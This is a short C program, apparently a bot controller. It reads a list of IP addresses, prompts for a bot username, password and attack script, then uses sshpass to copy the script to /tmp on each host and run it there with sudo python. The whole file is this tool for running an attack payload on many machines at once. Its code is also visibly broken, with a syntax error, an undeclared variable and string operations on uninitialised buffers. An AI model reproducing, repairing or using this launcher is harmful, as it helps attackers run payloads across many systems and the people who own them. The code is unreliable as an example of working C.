#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<pthread.h>
#include<string.h>

char bUsername[20];
char bPassword[30];
char attackScript[20];

void * connect(void *);
int main()
{
    FILE *fp;
    fp = fopen("list.txt", "r");

    pthread_t thread[30];
    char ip[30][20];
    char * pos;
    int i = 0,len;

    printf("Bot Username:");
    scanf("%s", bUsername);
    printf("Bot Password:");
    scanf("%s", bPassword);
    printf("Attack Script:");
    scanf("%s", attackScript);

    if(fp! = NULL)
    {
        while(fgets(ip[i], sizeof(ip[i]), fp) != NULL)
        {
            if((pos = strchr(ip[i], '\n')) != NULL)
                *pos = '\0';
            i++;
        }
    }

    len = i;
    fclose(fp);

    for(i = 0; i<len; i++)
        pthread_create(&thread[i], NULL, connect, (void *)ip[i]);

    for(i = 0; i<len; i++)
        pthread_join(thread[i], NULL);

    return 0;

}
void * connect(void * ptr)
{
    char b[100];
    FILE *fp;
    char ip[100], ip1[100], ip2[100];
    char cmd1[300], cmd2[300], pwd[50];

    strcpy(ip, ptr);
    strcpy(ip1, ip);
    strcat(cmd1, "sshpass -p ");
    strcat(pwd, "'");
    strcat(pwd, botPassword);
    strcat(pwd, "'");
    strcat(cmd1, pwd);
    strcat(cmd1, " scp ");
    strcat(cmd1, attackScript);
    strcat(cmd1, " ");
    strcat(cmd1, bUsername);
    strcat(cmd1, "@");
    strcat(cmd1, strcat(ip1,":/tmp"));
    system(cmd1);
	strncpy(ip2, ip, 16);
    strncpy(cmd2, "sshpass -p ", 15);
    strcat(cmd2, pwd);
    strcat(cmd2, " ssh -q -o 'NoHostAuthenticationForLocalhost yes' -o 'ConnectTimeout=1' ");
    strcat(cmd2, bUsername);
    strcat(cmd2, "@");
    strcat(cmd2, ip2);
    strcpy(b, "echo ");
    strcat(b, bPassword);
    strcat(b, " |sudo -S python /tmp/");
    strcat(b, attackScript);

    fp = popen(cmd2,"w");
    fputs(b,fp);
    pclose(fp);
}